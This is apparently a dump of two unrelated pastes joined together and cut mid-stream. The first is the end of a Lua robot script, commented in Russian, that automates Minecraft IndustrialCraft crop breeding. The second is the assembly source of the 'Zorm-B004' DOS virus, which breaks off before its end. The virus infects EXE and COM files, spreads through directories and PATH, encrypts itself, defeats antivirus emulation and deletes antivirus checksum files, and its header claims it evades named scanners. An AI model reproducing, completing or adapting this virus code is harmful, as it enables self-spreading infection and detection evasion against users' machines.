        robotTryForward()
        --конечное положение C1 смотрит влево
    end
    if c == 2 then
        --начальное положение P0 смотрим вверх
        robotTryForward()
        robotTryForward()
        robotTryForward()
        robot.turnRight()
        robotTryForward()
        robot.turnLeft()
        --конечное положение C2 смотрит вверх
    end
    if c == 3 then
        --начальное положение P0 смотрим вверх
        robotTryForward()
        robotTryForward()
        robot.turnAround()
        --конечное положение C3 смотрит вниз
    end
    if c == 4 then
        --начальное положение P0 смотрим вверх
        robotTryForward()
        robot.turnLeft()
        robotTryForward()
        robot.turnLeft()
        --конечное положение C4 смотрит вниз
    end
    if c == 5 then
        --начальное положение P0 смотрим вверх
        robotTryForward()
        robot.turnRight()
        robotTryForward()
        --конечное положение C5 смотрит вправо
    end
 
end
function grabCropsFromBarrel() --пополняем запас палок в роботе из бочки. 
    --возвращает true если после попытки взять палки, есть хотя бы одна палка в роботе
    --возвращает false если палки в роботе и в бочке кончились
    cropsStackSize = 62 --размер стака палок, который робот возит с собой. 62 потому что при уничтожения кропса робот выдерает из земли и палки, и они могут попасть в нецелевой слот
    
    --палки лежат в первом слоте
    returnValue = true
    itemCount = robot.count(1)
    if itemCount < cropsStackSize then --если палок неполный стак, до доберем из бочки
        robot.select(1) --активизируем слот, в котором лежат палки
        robot.turnRight() --повернемся к бочке
        --добираем палок до полного стака
        robot.suck(cropsStackSize-itemCount)
        itemCount = robot.count(1) --смотрим сколько палок в роботе
        if itemCount == 0 then --если палки в роботе кончились
            returnValue = false --возвращаем признак, что ПАЛКИ В РОБОТЕ И БОЧКЕ КОНЧИЛИСЬ
        elseif itemCount < cropsStackSize then --если после попытки взять палки из бочки, мы имеем меньше стака палок в роботе
            print(""В бочке закончились палки!"")
            computer.beep(1000,1)
            returnValue = true
        else
            returnValue = true
        end
        robot.turnLeft() --повернемся обратно к кропсам
    end
    return returnValue
end
function dropToChest() --все что есть в инвентори, скидываем в сундук
    --начальная позиция - P0 смотрим вверх
    robot.turnLeft()
    for i=2,16 do 
        item = component.inventory_controller.getStackInInternalSlot(i)
        if item then --если в слоте что-то есть
            robot.select(i)
            robot.drop() --сдаем все из текущего слота в сундук
        end
    end
    robot.turnRight() --поворачиваемся к с0
    robot.select(1)
end
function destroyAllDoubleCrops() --уничтожим все двойные кропсы
    --пройдемся по массиву статусов кропсов и у всех кропсов, у которых статус = ""жердочки"", съездим к ним и сломаем их
    for c=1,5 do
        if c_status[c] == ""double crop"" then
            robotGoTo_C_Crop_FromPark(c)
            robot.swingDown() --ломаем кропсы
            robotGoToPark(c)
        end
    end
    
end
function howInterestingIsThisCrop(c) --оценивает полезность нового растения сравнивая статы дочернего ростения [с] со статами материнский растений . тип растения во внимание не принимается
--возвращает: 0 - негодное
--            -1 - годно для сохранения
--            m - превосходит материнское, где 1<m<4 - номер материнского кропа, который нужно заменить новым растением 
 
    if c_grow[c] >= grow_kill then --если grow у дочернего растения достигло опасного значения, то это растение считаем негодным
        return 0
    end
    
    --если статы нового растения больше максимально разрешенных
    if (c_gain[c] > max_gain) or (c_grow[c] > max_grow) then
        --то считаем это растение приемлемым
        print(""Полученое растение, превышает максимальные статы."")
        return -1
    end
 
    --сравним статы нового растения со статами материнских растений
    maxDifference = 0 --самая лучшая разница в качестве
    m_crop_maxDifference = 0 --материнский кроп с самой лучшей разницей в качестве
    for m = 1, 4 do
        --сравниваем статы полученного растения со статами материнских растений
        difference = (c_gain[c] + c_grow[c] - c_resistans[c]) - (m_gain[m] + m_grow[m] - m_resistans[m])
        if (difference > 0) and (difference > maxDifference) then --если растение лучше и это лучшая разница в качестве
            maxDifference = difference --обновим лучшую разницу в качестве
            m_crop_maxDifference = m --материнский кроп с самой лучшей разницей в качестве
        end
    end
    if maxDifference>0 then
        --полученное растение лучше чем одно из материнских, а значит нужно пересадить (на самый слабый материнский кроп)
        return m_crop_maxDifference --возвращаем материнский кроп с самой лучшей разницей в качестве
    end
    
    --если мы здесь, значит новое растение не привысило максимальные статы и не лучше чем материнские растения
    --а занчит   РАСТЕНИЕ ПЛОХОЕ
    return 0
 
end
function placeDoubleCrops() --ставит новые палки
    component.inventory_controller.equip() --экипируем кропсы(палки)
    robot.useDown() --ставим палку на землю
    robot.useDown() --ставим палку (получаются жердочки для скрещивания)
    component.inventory_controller.equip() --возвращаем в руки лопатку
end
function findSeedsInRobotInventory() --возвращает номер слота в инвентори робота с семечками, если нет семечек, то возвращает 0, а если вообще ничего нет, то возвращает -1
    foundAnything = false
    for i=2,16 do 
        item = component.inventory_controller.getStackInInternalSlot(i)
        if item then --если в слоте что-то есть
            foundAnything = true
            if item.name == ""IC2:itemCropSeed"" then --если в слоте семена
                return i --возвращаем номер слота, в котором семена
            end
        end
    end
    if foundAnything then --если что-то нашли (обычно это урожай), но семян не было
        return 0
    end
    return -1 --вообще ничего нет
end
function analizeAndProceed(c) --функция анализа и обработки кропа. с - номер кропа.
 
    
    analyze_result = geo.analyze(0) --анализируем блок под роботом 
    c_cropname[c] = get_crop_stat(analyze_result, ""crop:name"")
    if c_cropname[c] ~= nil then -- если перед нами что-то вывелось, а не пустые палки
        
        
        --получаем остальные статы кропа
        c_gain[c] = get_crop_stat(analyze_result, ""crop:gain"")
        c_grow[c] = get_crop_stat(analyze_result, ""crop:grow"")
        c_resistans[c] = get_crop_stat(analyze_result, ""crop:resistance"")
        c_size[c] = get_crop_stat(analyze_result, ""crop:size"")
        c_maxSize[c] = get_crop_stat(analyze_result, ""crop:maxSize"")
 
        if c_status[c] == ""double crop"" or c_status[c] == ""unknown"" then  --если статус растения был двойные палки, значит появилось новое растение
            print(""Новый кроп С""..c.."": ""..c_cropname[c]..""  ""..c_grow[c]..""  ""..c_gain[c]..""  ""..c_resistans[c]) -- ""Новый кроп С1:    reed""
            --print(c_grow[c], c_gain[c], c_resistans[c], ""size: ""..c_size[c]..""/""..c_maxSize[c]) --""23   31   0   size: 2/3""
        end
        
        --если прокнуло растение другого вида, выкапываем его лопаткой и отвозим в сундук
        if c_cropname[c] ~= cropname then
            robot.useDown()--по умолчанию у нас в руках лопатка, юзаем ее
            component.inventory_controller.equip() --экипируем кропсы(палки)
            robot.useDown() --ставим палку (получаются жердочки для скрещивания)
            component.inventory_controller.equip() --возвращаем в руки лопатку
            c_status[c] = ""double crop"" --устанавливаем статус растения - жердочки
            
            --после копки проверим инвентори робота
            foundAnything = false
            for i=2,16 do 
                item = component.inventory_controller.getStackInInternalSlot(i)
                if item then --если в слоте что-то есть
                    foundAnything = true
                end
            end
            
            if foundAnything or robot.count(1) == 0 then --если что-то выкопалось от этого непрофильного растения или закончились палки
                robotGoToPark(c) --едем на парковку   
                if foundAnything then --если есть в инветори что-то выкопанное, сдаем в сундук
                    dropToChest()
                end
                --пополняем запас палок в роботе
                if grabCropsFromBarrel() then 
                else --если палки кончились
                    destroyAllDoubleCrops() --уничтожим все двойные кропсы
                    robot_error(""ПАЛКИ КОНЧИЛИСЬ!"") --заканчиваем работу с ошибкой
                end
                robotGoTo_C_Crop_FromPark(c)
            end
        else--если растение нужного типа
            if c_status[c] == ""double crop"" or c_status[c] == ""unknown"" then  --если статус растения был двойные палки, значит появилось новое растение
                --оценим полезность нового растения
                interest = howInterestingIsThisCrop(c)
                
                --выведем инфу о новом кропе
                interestString = """"
                if interest == 0 then
                    interestString = ""негодное""
                elseif interest == -1 then
                    interestString = ""годное, статы дошли до целевых""
                else
                    interestString = ""превосходит материнское М""..interest
                end
                print(""Полезность:""..interestString)
                
                if interest == 0 then -- растение с плохими статами
                    --уничтожаем растение
                    robot.swingDown() --ломаем кропсы
                    placeDoubleCrops() --ставим новые палки
                    c_status[c] = ""double crop"" --устанавливаем статус растения - жердочки
                    --посмотрим, попали ли семечки в инвентори
                    seedSlot = findSeedsInRobotInventory() --находим слот с семечками
                    if seedSlot > 0 then --если семечки есть
                        --отвезем эти семечки домой
                        robotGoToPark(c) --едем на парковку
                        dropToChest() --сбрасываем всё в сундук
                        grabCropsFromBarrel() --добираем палок из бочки
                        robotGoTo_C_Crop_FromPark(c) --возвращаемся на кроп
                    end
                else --растение со статами превышающими материнские или статы дошли до целевых
                    c_status[c] = ""growing"" --устанавливаем статус растущего кропа
                    --оставляем его в покое, пусть растет
                end
            
            else -- c_status[c] == ""growing"" --растение уже ранее сканировалось
                
                if c_size[c] == c_maxSize[c] then --если растение доросло
                    robot.swingDown() --ломаем кропсы, собираем урожай
                    placeDoubleCrops() --ставим новые палки
                    c_status[c] = ""double crop"" --устанавливаем статус растения - жердочки
                    
                    --посмотрим, попали ли семечки в инвентори
                    seedSlot = findSeedsInRobotInventory() --находим слот с семечками
                    if seedSlot > 0 then --если семечки есть
                        --делаем повторную оценку полезности
                        interest = howInterestingIsThisCrop(c)
                        if interest == -1 then --годное, статы дошли до целевых
                            --везем в сундук
                            robotGoToPark(c) --едем на парковку
                            dropToChest() --сбрасываем всё в сундук
                            grabCropsFromBarrel() --добираем палок из бочки
                            robotGoTo_C_Crop_FromPark(c) --возвращаемся на кроп
                            
                        elseif interest > 0 then --превосходит материнское
                            --меняем материнское ростение на текущее дочернее
                            print(""Заменяем кроп М""..interest.."":  ""..m_grow[interest]..""  ""..m_gain[interest]..""  ""..m_resistans[interest].."" -> ""..c_grow[c]..""  ""..c_gain[c]..""  ""..c_resistans[c])
                            --обновляем статы материнского растения
                            m_grow[interest] = c_grow[c]
                            m_gain[interest] = c_gain[c]
                            m_resistans[interest] = c_resistans[c]
                            --едем менять материнское растение
                            robotGoToPark(c) --едем через паркинг. прямых маршрутов от С до M робот не знает
                            robotGoTo_M_Crop_FromPark(interest) --едем на материнский кропс, который будем менять
                            robot.swingDown() --ломаем кропсы, собираем урожай
                            component.inventory_controller.equip() --экипируем кропсы(палки)
                            robot.useDown() --ставим палку на землю
                            component.inventory_controller.equip() --возвращаем в руки лопатку
                            robot.select(seedSlot) --делаем активным слот с семенами, которые мы собираемся сажать
                            component.inventory_controller.equip() -- берем семена в руки
                            robot.useDown() --сажаем
                            component.inventory_controller.equip() -- берем обратно лопатку в руки
                            robot.select(1)
                            robotGoToParkFrom_M_Crop(interest) --едем на паркинг
                            dropToChest() --сбрасываем всё в сундук
                            grabCropsFromBarrel() --добираем палок из бочки
                            robotGoTo_C_Crop_FromPark(c) --возвращаемся на кроп
                        end
                    end
                    
                    
                end
            end
        
        
        end 
        
        
            
        
        
 
    
    else -- если перед нами или пустые палки или воздух
        if c_status[c] == ""unknown"" then -- если мы сканируем этот кроп впервые
            if get_crop_stat(analyze_result, ""name"") == ""IC2:blockCrop"" then --если перед нами двойные палки
                c_status[c] = ""double crop""
            else --перед нами не растение и не двойные палки. значит перед нами воздух
                --ставим палки
                component.inventory_controller.equip() --экипируем кропсы(палки)
                robot.useDown() --ставим палку на землю
                robot.useDown() --ставим палку (получаются жердочки для скрещивания)
                component.inventory_controller.equip() --возвращаем в руки лопатку
                c_status[c] = ""double crop"" --устанавливаем статус растения - жердочки
            end
            
        end
        
    end 
 
end
 
 
 
----------------------------------------------------
--Шаг 1
--Начинаем работать 
print(""--------------------------------------""); --выводим приветствие
print(""Скрипт для робота, для поднятия статов у кропсов или разведения дубликатов запущен."");
print(""Версия: ""..ver)
if mode == 1 then -- 1 - режим поднятия статов кропсов
    print(""Выбран режим поднятия статов кропсов."");
else -- 2 - режим разведения дубликатов кропсов
    print(""Выбран режим разведения дубликатов кропсов."");
end
print(""Шаг 1. Проверка входящих условий.""); 
 
-- проверяем правильность входящий условий
 
--В руках должна быть лопатка
robot.select(1) --выбираем первый слот инвентори, на случай если при начале работы был выбран другой слот
component.inventory_controller.equip() --убираем лопатку к себе в инвентори и смотрим, лопатка ли это?
item = component.inventory_controller.getStackInInternalSlot(1)
if item == nil then --если в слоте ничего нет
    robot_error(""Нет лопатки в слоте для инструмента!"")
end
if item.name ~= ""berriespp:itemSpade"" then --если в слоте что-то есть, но это не лопатка
    robot_error(""Нет лопатки в слоте для инструмента!"")
end
component.inventory_controller.equip() --лопатку возвращаем в слот для инструмента
 
--print(""Входящие условия соблюдены."")
 
----------------------------------------------------
--Шаг 2
if mode == 1 then -- 1 - режим поднятия статов кропсов
    print(""Шаг 2. Сканируем материнские кропсы и запоминаем их статы."")
 
    --Сканируем материнские кропсы и запоминаем их статы
    --Исходная позиция - робот стоит на P0
 
    -- кроп M1
    robotMove_P0_M1()
    analyze_result = geo.analyze(0)
    cropname = get_crop_stat(analyze_result, ""crop:name"")
    m_gain[1] = get_crop_stat(analyze_result, ""crop:gain"")
    m_grow[1] = get_crop_stat(analyze_result, ""crop:grow"")
    m_resistans[1] = get_crop_stat(analyze_result, ""crop:resistance"")
    print(""M1:"", cropname, m_grow[1], m_gain[1], m_resistans[1])
 
    -- кроп M2
    robotMove_M1_M2()
    analyze_result = geo.analyze(0)
    cropname = get_crop_stat(analyze_result, ""crop:name"")
    m_gain[2] = get_crop_stat(analyze_result, ""crop:gain"")
    m_grow[2] = get_crop_stat(analyze_result, ""crop:grow"")
    m_resistans[2] = get_crop_stat(analyze_result, ""crop:resistance"")
    print(""M2:"", cropname, m_grow[2], m_gain[2], m_resistans[2])
    
    -- кроп M3
    robotMove_M2_M3()
    analyze_result = geo.analyze(0)
    cropname = get_crop_stat(analyze_result, ""crop:name"")
    m_gain[3] = get_crop_stat(analyze_result, ""crop:gain"")
    m_grow[3] = get_crop_stat(analyze_result, ""crop:grow"")
    m_resistans[3] = get_crop_stat(analyze_result, ""crop:resistance"")
    print(""M3:"", cropname, m_grow[3], m_gain[3], m_resistans[3])
 
    -- кроп M4
    robotMove_M3_M4()
    analyze_result = geo.analyze(0)
    cropname = get_crop_stat(analyze_result, ""crop:name"")
    m_gain[4] = get_crop_stat(analyze_result, ""crop:gain"")
    m_grow[4] = get_crop_stat(analyze_result, ""crop:grow"")
    m_resistans[4] = get_crop_stat(analyze_result, ""crop:resistance"")
    print(""M4:"", cropname, m_grow[4], m_gain[4], m_resistans[4])
 
    
    robotMove_M4_P0() --возвращаем робота в исходное положение
 
end
----------------------------------------------------
--Шаг 3
if mode == 1 then -- 1 - режим поднятия статов кропсов
    print(""Шаг 3. Приступаем к поднятию статов."");
else -- 2 - режим разведения дубликатов кропсов
    print(""Шаг 2. Приступаем к разведению дубликатов кропсов."");
end
 
while true do --главный цикл
    
    --пополняем запас палок в роботе
    if grabCropsFromBarrel() then 
    else --если палки кончились
        destroyAllDoubleCrops() --уничтожим все двойные кропсы
        robot_error(""ПАЛКИ КОНЧИЛИСЬ!"")
    end
    
    --едем сканить дочерние кропсы
    robotMove_P0_C1()
    analizeAndProceed(1)
    robotMove_C1_C4()
    analizeAndProceed(4)
    robotMove_C4_C5()
    analizeAndProceed(5)
    robotMove_C5_C2()
    analizeAndProceed(2)
    robotMove_C2_C3()
    analizeAndProceed(3)
    robotMove_C3_P0() --конечное положение P0 смотрим вверх
    
    --os.exit()
    
 
    os.sleep(15)
end
 
os.exit()
 
--История версий:
 
--Версия 1.1.3
--Устранена уязвимость к коллизиям. Нахождение игрока на пути следования робота больше не приводит к потере роботом маршрута. Робот после столкновения с игроком замирает на секунду, после чего продолжает попытку движения
--Добавлена история версий в файл скрипта робота"
B0JmsNdR,Zorm-B004 Virus - Source Code,FlyFar,ASM (NASM),Friday 16th of June 2023 08:45:32 AM CDT,"
;
;    ���������������������\ ������������\ ��������������\     ��\         ��\
;                  �����\   ��\       ��\ ��\        ���\     ����\     ����\
;                �����\     ��\       ��\ ��\        ���\     ��\ ��\ ��\ ��\
;              �����\       ��\       ��\ ������������\ \     ��\   ��\   ��\                        
;            �����\         ��\       ��\ ��\         ��\     ��\         ��\
;          �����\           ��\       ��\ ��\          ��\    ��\         ��\                                        
;        �����\             ��\       ��\ ��\           ��\   ��\         ��\
;      �����\               ��\       ��\ ��\            ��\  ��\         ��\
;    ���������������������\ ������������\ ��\             ��\ ��\         ��\
;
;(C)By Dr L. from Lamer Corporation  March/July 1998
;
;Description:
;             -      Name:..........Zorm-B004     
;             -      Mode:..........Direct infector no TSR
;             -    Target:..........Exe/Com of Msdos (even com of dos7+)
;             -    Status:..........Not detected by Tbav806,F-prot301,228        
;                                   dr.Web,Avp30,nod-ice,findvirus786  
;                                                   (2nd+ generations)      
;             - Description: 
;               This virus infects 2 exe+2 com files when executed.             
;               Can change of directory by using both dot-dot method
;               and the path variable of dos environnment.
;               It doesnt contain nasty routines.
;               Its twice encrypted and use several anti-emulation
;               routines.It doesnt infect command.com and win.com 
;               of win95.  
;               It erases most checksums files made by anti-virus  
;               in the directories where it have found targets to
;               infect.
;               Anti-lamer routine included :)
;
;             - Disclaimer:
;               This virus was written for research and educationnal
;               purposes.
;               Its the 4th version of this serie.
;               I have fixed some bugs.
;               But one problem still remains:
;                       This virus can damaged win.com/command.com of
;                       win31 when executed or maybe all can be fine
;                       i cant study this problem cause i dont have 
;                       win31!
;                          
;                         
;               Compile :tasm/m2 ,tlink/t 
;                    



.model tiny                         ;memory model
.code                               ;size <65536 

org 100h                            ;its a com file


;-------------------------Beginning---of----loader----------------------
start1:                               
db 0e9h,1,0                         ;jmp 001 byte forward
db 'V'                              ;infection mark

push ds                             ;save dx for later

push  cs                            ;set ds=cs
pop   ds                            ; 
        
mov word ptr [_ds],ds               ;save original ds for 
                                    ;later
          
mov byte ptr [com_virus],0          ;for the first time           
                                    ;you have to  do that
                                    ;(read below)
 
mov bp,0                            ;set bp the delta offset
                                    ;to zero.No shift to begin
 

jmp over_there

;---------------------------End-----of------loader----------------------


                                  

;----------------------------Beginning--of--virus-----------------------
start:                                
xor dx,dx                           ;set dx=0 for stability
mov cx,end_2nd-begin_2nd            ;cx=nber of bytes to decrypt
xor ax,ax
int 15h
cmp ah,86h                          ;thanx to yesna to show me this 
jz itsok                            ;trick ;) 
mov ah,4ch
int 21h
itsok:

 
mov ah,3dh                          ;anti-emulation trick. function 3dh 
int 21h                             ;int 21h= open file function.ds:dx
;mov al,02h                                    ;have to point to file name.
                                    ;but ds:dx points tojunk so dos returns
                                    ;al=02h.We use this value to decrypt
  
db 04h                              ;=add al,10h
       value db 10h                 ;

               
db 0bbh                             ;mov bx,patch
patch:                              ;patch=addr of begin_2nd.
       dw 0                         ;patch will be set later. 
                                    
;settings for decrypt bytes between begin_2nd and end_second is over.



;--------------------------------------------------------
;crypt/decrypt ""routine""
;
;remark: _ret will be changed into ""ret""  to transform this part 
;in a real asm routine.


crypt:
turn_again:
xor byte ptr cs:[bx],al
inc bx
loop turn_again
_ret:                               ;
     ret                            ;to be replaced

;--------------------------------------------------------


begin_2nd:
          db 2eh,0c6h,06h           ;=mov byte ptr cs:[ret_addr],c3h
ret_addr:                           ;
          dw 0                      ;(ret_addr=address where to put 'ret'.  
          db 0c3h                   ;c3h=opcode for ""ret"")
          

          db 0bbh                   ;=mov bx,0000h
          patch2:                   ;
              dw 0                  ;(patch2=addr of beginning of begin_main)
       
          db 0b0h                   ;=mov al,2
              _al:                  ;
              db 2                  ;
                                    ;(_al=xor key.Not fixed value during
                                    ;infection scheme.see below)   

 mov cx,end_main-begin_main         ;setting to decrypt bytes between 
                                    ;label begin_main and end_main is
                                    ;complete
                                     
 call crypt                         ;decrypt now!
 end_2nd:

       begin_main:
                  mov ax,ss         ;if cs=ss i'm a com 
                  mov cx,cs         ;
                  cmp ax,cx         ;if not,i'm exe! 
                   jz im_com        ;

im_exe:                  
                  cli               ;
                  mov ax,ss         ;reset ss=cs 
                  dec ax            ;at the start ss=cs+1 to avoid
                  mov ss,ax         ;""k"" flag of tbav.Maybe its a  
                  sti               ;lame way to do that but dont know
                                    ;how to use an other way.
 
  call compute_delta

  push ds                           ;save ds for later
    
  push cs                           ;set ds=cs
  pop  ds                           ;

  mov byte ptr [com_virus+bp],0     ;i'm not a com (save this info
                                    ;for later) 
  jmp next_exe                      ;whats follow for a exe file host?
                                    
im_com:

push ds                             ;save it for later



compute_delta_offset:
call compute_delta 
mov byte ptr [com_virus+bp],1       ;yep i'm a com file 

next_exe:

pop ax                              ;set ax=original ds
mov word ptr [_ds+bp],ax            ;set _ds=original ds
                                    ;you need it for pass
                                    ;control to host.

over_there:                         ;remember me?
                                    ;for the first execution 
                                    ;no need to decrypt
                                    

push es                             ;save es
     
push cs                             ;set es=cs
pop  es                             ;

cmp byte ptr [com_virus+bp],1       ;i'm a com?
 
jnz follow_me                       ;nope
 
lea si,store_bytes+bp               ;yep i'm 
mov di,100h                         ;ready to transfer byte from
                                    ;location ""store_bytes"" to 
                                    ;beginning of (com) host.
                                    ;(remember the code of *.com
                                    ;begin to cs:100h in memory)   

jmp transfer

follow_me: 
;cld
lea si,store+bp                     ;transfer from label ""store""
lea di,old+bp                       ;to label ""old""
movsw                               ;(set the correct values, segment: 
movsw                               ;offset for the return to host.)

transfer:
movsw                               ;you came from ""mov di,100h""? ok 
movsw                               ;restore (in memory only) the 4 first  
                                    ;originals bytes of host.
 
                                    ;you came from ""follow me""? ok restore
                                    ;originals cs:ip and ss:sp found in
                                    ;host (exe) header
 
pop es                              ;beware im back!
 
lea dx,new_dta+bp                   ;dont modify dta!
call set_dta                        ;change it!

mov byte ptr [flag_com+bp],'E'      ;at first we want to infect Exe
                                    

push es                             ;see you later!

create_new_int24h_handler:
mov ax,3524h                        ;                         
int 21h                             ;save original handler                          
mov word ptr [bp+old_int24h],bx     ;of int 24h for restore                         
mov word ptr [bp+old_int24h+2],es   ;it later.                         

mov ah,25h                          ;set a new handler for
lea dx,bp+int_24h                   ;int 24h.
int 21h                             ;so dos dont pop up 
                                    ;a infamous error message if virus
                                    ;try to infect write protected
                                    ;disk.

pop es                              ;its me again babe!

count:
mov byte ptr [count_infect+bp],0    ;reset the counter to 0
                                    ;self explanory 

get_dir:

 mov ah,47h                         ;
 lea si,current_dir+bp              ;save the current directory
 xor dl,dl                          ;for later when virus pass 
 int 21h                            ;control to host and the return to 
                                    ;dos.the size of buffer is  64 bytes.
get_disk:
         mov ah,19H                 ;from a:or b:or...virus is running?       
         int 21h                    ;
         mov byte ptr [disk+bp],al  ;
         cmp al,02H                 ;virus infect c: not other drive.
                                    ;in practice .
         jz search_begin_path       ;but if you are running the virus 
         mov dl,02h                 ;from an drive ,not c:,it infects
         mov ah,0eh                 ;drive c:.
         int 21h                    ;
;-------------------------------------------------------------
;this part search the adress of first byte of the name of the 
;first directory include in dos path 
;remarks:
;         es is destroyed by the routine
;         es:di points to the address
;         we are searching
          
search_begin_path:

mov ax,es:002ch                     ;es:002ch=address of segment where
mov es,ax                           ;to found in memory the dos path.  
xor di,di                           ;
mov si,di

jmp suite                               
yet: 
      inc si
      mov di,si                          
suite:
     mov ax,'AP'                    ;
     scasw                          ;
     jnz yet                        ;
     mov ax,'HT'                    ;search the string 'PATH='
     scasw                          ;in memory
     jnz yet                        ;
     mov al,'='                     ;
     scasb                          ;
     jnz yet                        ;


;---------------------------------------------------------------------------





;------------------------------------------------------------------
;main part of virus routine to search for files
;to infect.

pathdir:                            ;
       call search                  ;go to search in current dir
again1:                             ;
       jc parent                    ;no file found go to ""parent""
       call infect                  ;one file found infect it! 
       
   cmp byte ptr [count_infect+bp],2 ; 
   jz end_infect                    ;
   call search_again                ;
   jmp again1                       ;
parent:    
       call up_dir                  ; 
       jnc pathdir                  ;
change_to_c:        
       call change_path_dir         ;
       jnz pathdir                  ;
       jmp end_infect               ;
;------------------------------------------------------------------

infect:
         mov ax,3d02h
         lea dx,new_dta+1eh+bp
         int 21h

read_header:
         
            xchg ax,bx
            mov ah,3fh
            mov cx,1ch
            lea dx,exe_header+bp
            int 21h
test1:
            cmp word ptr [exe_header+bp],'ZM';is it really an exe?
            je test3
test2:
            cmp word ptr [exe_header+bp],'MZ';idem
            jne its_a_com
test3:
            cmp word ptr [exe_header+bp+12h],'VI';infected?
            je terminer                          ;yes,bye bye

test3b: 
            cmp word ptr [exe_header+bp+2],00c6h
            jne test4
            cmp word ptr [exe_header+bp+4],00b7h
            je terminer 
test4:
            cmp word ptr [exe_header+bp+26],0    ;overlay=0?
            jne terminer                         ;not,bye bye
test5:
            cmp word ptr [exe_header+bp+24],40h  ;windows exe?  
            je terminer                          ;yes ,adios :(

            mov byte ptr [com_target+bp],0
            jmp get_attributes
its_a_com:   

test_com:
             cmp byte ptr [exe_header+bp+3],'V'
             jz terminer
test_win:
             cmp word ptr [exe_header+4+bp],0e1fh
             jnz not_win_com
             cmp word ptr [exe_header+6+bp],0e807h
             jz terminer

 not_win_com:
             jmp suit
             end_infect:
             jmp end_infect2
             suit:
             push di
             push es
             push cs
             pop es
             mov byte ptr [com_target+bp],1

             lea si,exe_header+bp
             lea di,store_bytes+bp
             movsw
             movsw
             pop es
             pop di

get_attributes:
                 mov ax,4300h
                 lea dx,new_dta+1eh+bp
                 int 21h
                 mov word ptr [attribute+bp],cx
set_attributes:
                 lea dx,new_dta+1eh+bp
                 call set_attrib
kill_crc_files:


;-----------------------------------------------
;delete crc files

                 lea dx,killfile1+bp
                 call set_attrib
                 call kill_file
 jmp next
 terminer:
 jmp close_file
 next: 
                 lea dx,killfile2+bp
                 call set_attrib
                 call kill_file

                 lea dx,killfile3+bp
                 call set_attrib
                 call kill_file
;------------------------------------------------

 
get_time_date:
                 mov ax,5700h
                 int 21h
                 push cx
                 push dx
cmp byte ptr [com_target+bp],1
jz go_end_of_file
store_info_header:
                   mov ax,word ptr [exe_header+bp+0eh]
                   mov word ptr [store_ss+bp],ax
                   mov ax,word ptr [exe_header+bp+10h]   
                   mov word ptr [store_sp+bp],ax
 
                   mov ax,word ptr [exe_header+bp+14h]
                   mov word ptr [store_ip+bp],ax

                   mov ax,word ptr [exe_header+bp+16h]
                   mov word ptr [store_cs+bp],ax         
go_end_of_file:
 call go_end
 cmp byte ptr [com_target+bp],1
 jnz next_exe_infect
sub ax,7
xchg ax,dx
mov cx,0
mov ax,4200h
int 21h


mov ah,03fh
mov cx,07h
lea dx,queue+(end_virus-start)+bp
int 21h


add word ptr [queue+(end_virus-start)+5+bp],end_virus-start+7
call go_end
mov cx,ax
sub ax,3
mov word ptr [jmp_bytes+bp+1],ax

 add cx,100h
 jmp  change_patch

 next_exe_infect:     

       push ax dx

compute_new_csip:
                  push ax
                  mov ax,word ptr [exe_header+bp+8]
                  mov cl,4
                  shl ax,cl
                  mov cx,ax
                  pop ax
                  sub ax,cx
                  sbb dx,0
                  mov cl,0ch
                  shl dx,cl
                  mov cl,4
                  push ax
                  shr ax,cl
                  add dx,ax
                  shl ax,cl
                  pop cx
                  sub cx,ax 
change_header:
                  mov word ptr [exe_header+bp+14h],cx
                  mov word ptr [exe_header+bp+16h],dx
                  inc dx
                  mov word ptr [exe_header+bp+0eh],dx
                  mov word ptr [exe_header+bp+10h],0FF0h
                  mov word ptr [exe_header+bp+0ah],00FFh
                  mov word ptr [exe_header+bp+12h],'VI'
change_patch:
                  push cx
                  add cx,begin_main-start
                  mov word ptr [patch2+bp],cx
                  pop cx
                  push cx
                  add cx,_ret-start
                  mov word ptr [ret_addr+bp],cx
                  pop cx
                 
                  add cx,begin_2nd-start
                  mov word ptr [patch+bp],cx
                  cmp byte ptr [com_target+bp],1
                  jz write_virus   
                  pop dx ax
compute_size:
                  add ax,end_virus-start
                  adc dx,0
                  mov cx,512
                  div cx
                  cmp dx,0
                  je enough
                  inc ax
      enough:
                  mov word ptr [exe_header+bp+04],ax
                  mov word ptr [exe_header+bp+02],dx
 write_virus:
                  encipher:
                  call encrypt
                  ;--------------------------------
                  ;routine to avoid tbav ""U"" flag
                  ;""U""=undocumented dos interrupt
                  ;in fact tbav sets this flag
                  ;if it finds ""cdh,xyh"" string
                  ;where xy isnt a ordinary value
                  ;for an interrupt. 
    
                  lea si,queue+bp+(begin_2nd-start)
                  mov cx,end_virus-begin_2nd
      test_int:   
                  
                 cmp byte ptr [si],0cdh
                 je encipher
                 inc si 
                 loop test_int
                  ;-------------------------------

                  ;-------------------------------
                  ;90h=nop replace 'ret' by 'nop'
                  ;for the first execution of crypt
                  ;routine by the target exe
                  ;in the buffer before write it.   
                  mov byte ptr [bp+queue+(_ret-start)],90h 
                  ;-------------------------------
                 
                  ;-------------------------------
                  ;write the virus to the target file
                  mov ah,40h
                  mov cx,(end_virus-start)+7
                  lea dx,bp+queue
                  int 21h
                  ;-------------------------------
                  
                  ;-------------------------------
                  ;set the file pointer of target to
                  ;the beginning.
go_beginning:
                  mov ax,4200h
                  xor cx,cx
                  cwd
                  int 21h
                  ;-------------------------------

copy_new_header:
                  cmp byte ptr [com_target+bp],1
                  jnz copy_exe
                  lea dx,jmp_bytes+bp
                  mov cx,4
jmp go_copy
copy_exe:        
                  mov cx,1ah
                  lea dx,exe_header+bp
go_copy:
                  mov ah,40h
                  int 21h
inc_counter:
                  inc byte ptr [count_infect+bp]
restore_file_attribute:
                       mov cx,attribute+bp
                       lea dx,1eh+bp+new_dta
                       mov ax,4301h
                       int 21h
restore_date_time:
                       mov ax,5701h
                       pop dx
                       pop cx
                       int 21h   
  close_file:
                  mov ah,3eh
                  int 21h
                  ret

 end_infect2:


restore_disk:           
                  mov dl,byte ptr [disk+bp]
                  mov ah,0Eh
                  int 21h                  
                  
restore_directory:                   
                  mov ah,3bh
                  mov byte ptr [slash+bp],'\'
                  lea dx,[current_dir-1]+bp
                  int 21h
cmp byte ptr [flag_com+bp],'C'
jz exit

mov byte ptr [flag_com+bp],'C'    ;set this flag to avoid 
jmp count 

exit:

restore_initial_ds_value:

                  mov ax,word ptr [_ds+bp]
                  push ax
                  pop ds

restore_initial_dta:
                  mov dx,80h
                  call set_dta
restore_initial_24h_interrupt:

                 push ds
                 mov ax,2524h
                 lds dx,bp+old_int24h
                 int 21h
                 pop ds

restore_initial_es:                  
                  push ds
                  pop es

cmp byte ptr [com_virus+bp],1
jnz finish_exe

return_com_host:

